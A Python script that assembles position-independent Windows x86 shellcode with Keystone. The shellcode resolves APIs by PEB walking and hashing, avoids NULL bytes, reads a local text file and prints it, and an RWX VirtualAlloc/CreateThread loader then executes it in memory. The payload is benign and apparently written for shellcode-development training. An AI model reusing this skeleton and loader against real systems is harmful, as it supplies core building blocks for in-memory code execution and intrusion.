# This is used to read file content to the console

import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    #"   int3                            ;"  # Remove in production
    "   mov   ebp, esp                  ;"  #
    "   add   esp, 0xfffff9f0           ;"  # Avoid NULL bytes

    # --- Original function resolution ---
    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  # ECX = 0
    "   mov   esi,fs:[ecx+0x30]         ;"  # ESI = PEB
    "   mov   esi,[esi+0x0C]            ;"  # ESI = PEB->Ldr
    "   mov   esi,[esi+0x1C]            ;"  # ESI = InInitOrder list
    " next_module:                       "  #
    "   mov   ebx, [esi+0x08]           ;"  # EBX = DLL base
    "   mov   edi, [esi+0x20]           ;"  # EDI = DLL name
    "   mov   esi, [esi]                ;"  # ESI = next module
    "   cmp   [edi+12*2], cx            ;"  # Check name length
    "   jne   next_module               ;"  #
    " find_function_shorten:             "  #
    "   jmp find_function_shorten_bnc   ;"  #
    " find_function_ret:                 "  #
    "   pop esi                         ;"  #
    "   mov   [ebp+0x04], esi           ;"  # Save find_function
    "   jmp resolve_symbols             ;"  #
    " find_function_shorten_bnc:         "  #
    "   call find_function_ret          ;"  #
    " find_function:                     "  #
    "   pushad                          ;"  #
    "   mov   eax, [ebx+0x3c]           ;"  # PE header
    "   mov   edi, [ebx+eax+0x78]       ;"  # Export table
    "   add   edi, ebx                  ;"  #
    "   mov   ecx, [edi+0x18]           ;"  # NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  # AddressOfNames
    "   add   eax, ebx                  ;"  #
    "   mov   [ebp-4], eax              ;"  #
    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #
    "   dec   ecx                       ;"  #
    "   mov   eax, [ebp-4]              ;"  #
    "   mov   esi, [eax+ecx*4]          ;"  #
    "   add   esi, ebx                  ;"  #
    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #
    "   cdq                             ;"  #
    "   cld                             ;"  #
    " compute_hash_again:                "  #
    "   lodsb                           ;"  #
    "   test  al, al                    ;"  #
    "   jz    compute_hash_finished     ;"  #
    "   ror   edx, 0x0d                 ;"  #
    "   add   edx, eax                  ;"  #
    "   jmp   compute_hash_again        ;"  #
    " compute_hash_finished:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #
    "   jnz   find_function_loop        ;"  #
    "   mov   edx, [edi+0x24]           ;"  #
    "   add   edx, ebx                  ;"  #
    "   mov   cx,  [edx+2*ecx]          ;"  #
    "   mov   edx, [edi+0x1c]           ;"  #
    "   add   edx, ebx                  ;"  #
    "   mov   eax, [edx+4*ecx]          ;"  #
    "   add   eax, ebx                  ;"  #
    "   mov   [esp+0x1c], eax           ;"  #
    " find_function_finished:            "  #
    "   popad                           ;"  #
    "   ret                             ;"  #

    # --- Resolve APIs with YOUR hashes ---
    " resolve_symbols:                   "
    "   mov   eax, 0x7D7D7D7D           ;"  # All non-null bytes
    "   sub   eax, 0x17D65D8            ;"  # 0x7D7D7D7D - 0x017D65D8 = 0x7C0017A5
    "   push  eax                       ;"  # Push hash
    "   call dword ptr [ebp+0x04]       ;"  #
    "   mov   [ebp+0x10], eax           ;"  # Save CreateFileA

    "   push  0x10fa6516                ;"  # ReadFile hash (your value)
    "   call dword ptr [ebp+0x04]       ;"  #
    "   mov   [ebp+0x14], eax           ;"  # Save ReadFile

    "   push  0x0ffd97fb                ;"  # CloseHandle hash (your value)
    "   call dword ptr [ebp+0x04]       ;"  #
    "   mov   [ebp+0x18], eax           ;"  # Save CloseHandle

    "   push  0x7487d823                ;"  # GetStdHandle hash
    "   call dword ptr [ebp+0x04]       ;"  #
    "   mov   [ebp+0x1C], eax           ;"  # Save GetStdHandle

    "   push  0x88d2f963                ;"  # WriteConsoleA hash
    "   call dword ptr [ebp+0x04]       ;"  #
    "   mov   [ebp+0x20], eax           ;"  # Save WriteConsoleA

    # --- Get console output handle ---
    " get_console:                      "
    "   push  -11                       ;"  # STD_OUTPUT_HANDLE
    "   call dword ptr [ebp+0x1C]       ;"  # GetStdHandle
    "   mov   [ebp-0xC], eax            ;"  # Save console handle

    # --- File operations ---
    " build_path:                        "
    "   xor   ecx, ecx                  ;"  # ECX = 0
    "   push  ecx                       ;"  # Null terminator
    "   push  0x7478742e                ;"  # '.txt'
    "   push  0x3332315c                ;"  # '\123'
    "   push  0x736c6f6f                ;"  # 'ools'
    "   push  0x545c3a43                ;"  # 'C:\T'
    "   mov   esi, esp                  ;"  # ESI = file path

    #" build_path:                        "
    #"   cld                             ;"  # Clear direction flag (forward)
    #"   lea   edi, [ebp-0x200]          ;"  # Use this buffer for path
    #"   mov   esi, 0x545c3a43           ;"  # 'C:\T'
    #"   mov   [edi], esi                ;"  # Store first part
    #"   add   edi, 4                    ;"  # Advance pointer
    #"   mov   esi, 0x736c6f6f           ;"  # 'ools'
    #"   mov   [edi], esi                ;"  # Store second part
    #"   add   edi, 4                    ;"  # Advance pointer
    #"   mov   esi, 0x3332315c           ;"  # '\123'
    #"   mov   [edi], esi                ;"  # Store third part
    #"   add   edi, 4                    ;"  # Advance pointer
    #"   mov   esi, 0x7478742e           ;"  # '.txt'
    #"   mov   [edi], esi                ;"  # Store fourth part
    #"   add   edi, 4                    ;"  # Advance pointer
    #"   xor   eax, eax                  ;"  # Null terminator
    #"   mov   [edi], al                 ;"  # Store null byte
    #"   lea   esi, [ebp-0x200]          ;"  # ESI now points to complete path

    " open_file:                         "
    "   xor   ecx, ecx                  ;"  # ECX = 0
    "   push  ecx                       ;"  # hTemplateFile = NULL
    "   push  0x80                      ;"  # FILE_ATTRIBUTE_NORMAL
    "   push  0x3                       ;"  # OPEN_EXISTING
    "   push  ecx                       ;"  # lpSecurityAttributes = NULL
    "   push  0x1                       ;"  # FILE_SHARE_READ
    "   mov   eax, 0x7FFFFFFF           ;"  # 
    "   add   eax, 1                    ;"  # GENERIC_READ (0x80000000)
    "   push  eax                       ;"  #
    "   push  esi                       ;"  # lpFileName
    "   call dword ptr [ebp+0x10]       ;"  # CreateFileA
    "   mov   [ebp-4], eax              ;"  # Save file handle

    " read_file:                         "
    "   lea   edi, [ebp-0x300]          ;"  # EDI = buffer address
    "   xor   ecx, ecx                  ;"  # ECX = 0
    "   push  ecx                       ;"  # lpOverlapped = NULL
    "   lea   eax, [ebp-8]              ;"  # EAX = bytes read pointer
    "   push  eax                       ;"  # lpNumberOfBytesRead
    "   push  0x110                     ;"  # nNumberOfBytesToRead 
    "   push  edi                       ;"  # lpBuffer
    "   push  dword ptr [ebp-4]         ;"  # hFile
    "   call dword ptr [ebp+0x14]       ;"  # ReadFile

    # --- Null-terminate the read data ---
    "   mov   eax, [ebp-8]              ;"  # Get bytes read count
    "   mov   byte ptr [edi+eax], 0     ;"  # Null-terminate the string

    " close_file:                        "
    "   push  dword ptr [ebp-4]         ;"  # hFile
    "   call dword ptr [ebp+0x18]       ;"  # CloseHandle

    # --- Write to console ---
    " write_console:                     "
    "   xor   ecx, ecx                  ;"  # ECX = 0
    "   push  ecx                       ;"  # lpReserved = NULL
    "   lea   eax, [ebp-0x10]           ;"  # lpNumberOfCharsWritten
    "   push  eax                       ;"  #
    "   push  dword ptr [ebp-8]         ;"  # nNumberOfCharsToWrite
    "   push  edi                       ;"  # lpBuffer
    "   push  dword ptr [ebp-0xC]       ;"  # hConsoleOutput
    "   call dword ptr [ebp+0x20]       ;"  # WriteConsoleA

    # --- Clean exit ---
    "   push  0x78b5b983                ;"  # TerminateProcess hash
    "   call dword ptr [ebp+0x04]       ;"  #
    "   xor   ecx, ecx                  ;"  #
    "   push  ecx                       ;"  #
    "   push  -1                        ;"  #
    "   call  eax                       ;"  #
)


# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
